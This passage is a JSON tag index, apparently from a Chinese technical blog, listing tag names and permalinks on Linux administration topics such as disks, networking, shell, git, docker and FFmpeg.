vbox","permalink":"http://example.com/tags/vbox/"},{"name":"ping","slug":"ping","permalink":"http://example.com/tags/ping/"},{"name":"修改端口","slug":"修改端口","permalink":"http://example.com/tags/%E4%BF%AE%E6%94%B9%E7%AB%AF%E5%8F%A3/"},{"name":"rdp","slug":"rdp","permalink":"http://example.com/tags/rdp/"},{"name":"远程","slug":"远程","permalink":"http://example.com/tags/%E8%BF%9C%E7%A8%8B/"},{"name":"网卡MAC","slug":"网卡MAC","permalink":"http://example.com/tags/%E7%BD%91%E5%8D%A1MAC/"},{"name":"dmsetup","slug":"dmsetup","permalink":"http://example.com/tags/dmsetup/"},{"name":"losetup","slug":"losetup","permalink":"http://example.com/tags/losetup/"},{"name":"netstat","slug":"netstat","permalink":"http://example.com/tags/netstat/"},{"name":"md5","slug":"md5","permalink":"http://example.com/tags/md5/"},{"name":"pcie报错","slug":"pcie报错","permalink":"http://example.com/tags/pcie%E6%8A%A5%E9%94%99/"},{"name":"数组","slug":"数组","permalink":"http://example.com/tags/%E6%95%B0%E7%BB%84/"},{"name":"swap","slug":"swap","permalink":"http://example.com/tags/swap/"},{"name":"秘术：升核","slug":"秘术：升核","permalink":"http://example.com/tags/%E7%A7%98%E6%9C%AF%EF%BC%9A%E5%8D%87%E6%A0%B8/"},{"name":"常识","slug":"常识","permalink":"http://example.com/tags/%E5%B8%B8%E8%AF%86/"},{"name":"技巧","slug":"技巧","permalink":"http://example.com/tags/%E6%8A%80%E5%B7%A7/"},{"name":"系统救援","slug":"系统救援","permalink":"http://example.com/tags/%E7%B3%BB%E7%BB%9F%E6%95%91%E6%8F%B4/"},{"name":"秘术：切根","slug":"秘术：切根","permalink":"http://example.com/tags/%E7%A7%98%E6%9C%AF%EF%BC%9A%E5%88%87%E6%A0%B9/"},{"name":"远程工具","slug":"远程工具","permalink":"http://example.com/tags/%E8%BF%9C%E7%A8%8B%E5%B7%A5%E5%85%B7/"},{"name":"dd","slug":"dd","permalink":"http://example.com/tags/dd/"},{"name":"磁盘报错","slug":"磁盘报错","permalink":"http://example.com/tags/%E7%A3%81%E7%9B%98%E6%8A%A5%E9%94%99/"},{"name":"git","slug":"git","permalink":"http://example.com/tags/git/"},{"name":"版本控制","slug":"版本控制","permalink":"http://example.com/tags/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6/"},{"name":"项目管理","slug":"项目管理","permalink":"http://example.com/tags/%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86/"},{"name":"branch","slug":"branch","permalink":"http://example.com/tags/branch/"},{"name":"wget","slug":"wget","permalink":"http://example.com/tags/wget/"},{"name":"timeout","slug":"timeout","permalink":"http://example.com/tags/timeout/"},{"name":"docker","slug":"docker","permalink":"http://example.com/tags/docker/"},{"name":"nmcli","slug":"nmcli","permalink":"http://example.com/tags/nmcli/"},{"name":"CMOS","slug":"CMOS","permalink":"http://example.com/tags/CMOS/"},{"name":"curl","slug":"curl","permalink":"http://example.com/tags/curl/"},{"name":"自动化交互","slug":"自动化交互","permalink":"http://example.com/tags/%E8%87%AA%E5%8A%A8%E5%8C%96%E4%BA%A4%E4%BA%92/"},{"name":"lvm","slug":"lvm","permalink":"http://example.com/tags/lvm/"},{"name":"rsync","slug":"rsync","permalink":"http://example.com/tags/rsync/"},{"name":"sort","slug":"sort","permalink":"http://example.com/tags/sort/"},{"name":"shell后台运行脚本","slug":"shell后台运行脚本","permalink":"http://example.com/tags/shell%E5%90%8E%E5%8F%B0%E8%BF%90%E8%A1%8C%E8%84%9A%E6%9C%AC/"},{"name":"shell时间戳","slug":"shell时间戳","permalink":"http://example.com/tags/shell%E6%97%B6%E9%97%B4%E6%88%B3/"},{"name":"shell运算","slug":"shell运算","permalink":"http://example.com/tags/shell%E8%BF%90%E7%AE%97/"},{"name":"lrzsz","slug":"lrzsz","permalink":"http://example.com/tags/lrzsz/"},{"name":"pip","slug":"pip","permalink":"http://example.com/tags/pip/"},{"name":"tcp_ip","slug":"tcp-ip","permalink":"http://example.com/tags/tcp-ip/"},{"name":"网络抓包","slug":"网络抓包","permalink":"http://example.com/tags/%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85/"},{"name":"tcp重传","slug":"tcp重传","permalink":"http://example.com/tags/tcp%E9%87%8D%E4%BC%A0/"},{"name":"路径","slug":"路径","permalink":"http://example.com/tags/%E8%B7%AF%E5%BE%84/"},{"name":"时间","slug":"时间","permalink":"http://example.com/tags/%E6%97%B6%E9%97%B4/"},{"name":"时区","slug":"时区","permalink":"http://example.com/tags/%E6%97%B6%E5%8C%BA/"},{"name":"版本","slug":"版本","permalink":"http://example.com/tags/%E7%89%88%E6%9C%AC/"},{"name":"tcping","slug":"tcping","permalink":"http://example.com/tags/tcping/"},{"name":"npc","slug":"npc","permalink":"http://example.com/tags/npc/"},{"name":"vlan网卡","slug":"vlan网卡","permalink":"http://example.com/tags/vlan%E7%BD%91%E5%8D%A1/"},{"name":"自增","slug":"自增","permalink":"http://example.com/tags/%E8%87%AA%E5%A2%9E/"},{"name":"IFS","slug":"IFS","permalink":"http://example.com/tags/IFS/"},{"name":"磁盘坏道","slug":"磁盘坏道","permalink":"http://example.com/tags/%E7%A3%81%E7%9B%98%E5%9D%8F%E9%81%93/"},{"name":"版本兼容","slug":"版本兼容","permalink":"http://example.com/tags/%E7%89%88%E6%9C%AC%E5%85%BC%E5%AE%B9/"},{"name":"报错解决","slug":"报错解决","permalink":"http://example.com/tags/%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3/"},{"name":"centos7","slug":"centos7","permalink":"http://example.com/tags/centos7/"},{"name":"slice User","slug":"slice-User","permalink":"http://example.com/tags/slice-User/"},{"name":"磁盘挂载","slug":"磁盘挂载","permalink":"http://example.com/tags/%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/"},{"name":"磁盘解挂","slug":"磁盘解挂","permalink":"http://example.com/tags/%E7%A3%81%E7%9B%98%E8%A7%A3%E6%8C%82/"},{"name":"文件权限","slug":"文件权限","permalink":"http://example.com/tags/%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90/"},{"name":"paste","slug":"paste","permalink":"http://example.com/tags/paste/"},{"name":"硬件信息","slug":"硬件信息","permalink":"http://example.com/tags/%E7%A1%AC%E4%BB%B6%E4%BF%A1%E6%81%AF/"},{"name":"shell","slug":"shell","permalink":"http://example.com/tags/shell/"},{"name":"提取","slug":"提取","permalink":"http://example.com/tags/%E6%8F%90%E5%8F%96/"},{"name":"sed","slug":"sed","permalink":"http://example.com/tags/sed/"},{"name":"DNS","slug":"DNS","permalink":"http://example.com/tags/DNS/"},{"name":"正则表达式","slug":"正则表达式","permalink":"http://example.com/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"},{"name":"ethtool","slug":"ethtool","permalink":"http://example.com/tags/ethtool/"},{"name":"hyp","slug":"hyp","permalink":"http://example.com/tags/hyp/"},{"name":"配置","slug":"配置","permalink":"http://example.com/tags/%E9%85%8D%E7%BD%AE/"},{"name":"磁盘分区","slug":"磁盘分区","permalink":"http://example.com/tags/%E7%A3%81%E7%9B%98%E5%88%86%E5%8C%BA/"},{"name":"FFmpeg","slug":"FFmpeg","permalink":"http://example.com/tags/FFmpeg/"},{"name":"aircrack-ng","slug":"aircrack-ng","permalink":"http://example.com/tags/aircrack-ng/"},{"name":"galgame文件提取","slug":"galgame文件提取","permalink":"http://example.com/tags/galgame%E6%96%87%E4%BB%B6%E6%8F%90%E5%8F%96/"},{"name":"galgame游戏文件提取","slug":"galgame游戏文件提取","permalink":"http://example.com/tags/galgame%E6%B8%B8%E6%88%8F%E6%96%87%E4%BB%B6%E6%8F%90%E5%8F%96/"},{"name":"日志","slug":"日志","permalink":"http://example.com/tags/%E6%97%A5%E5%BF%97/"}]}